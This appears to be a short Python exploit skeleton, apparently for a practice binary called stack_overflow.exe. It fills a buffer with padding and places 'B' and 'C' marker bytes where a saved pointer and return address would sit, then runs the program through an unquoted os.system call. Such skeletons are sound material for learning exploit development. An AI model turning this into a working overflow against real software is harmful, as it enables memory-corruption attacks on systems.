import os
payload  = 'A'*(212-4)
payload += 'B'*4
payload += 'C'*4
os.system('stack_overflow.exe ' + payload)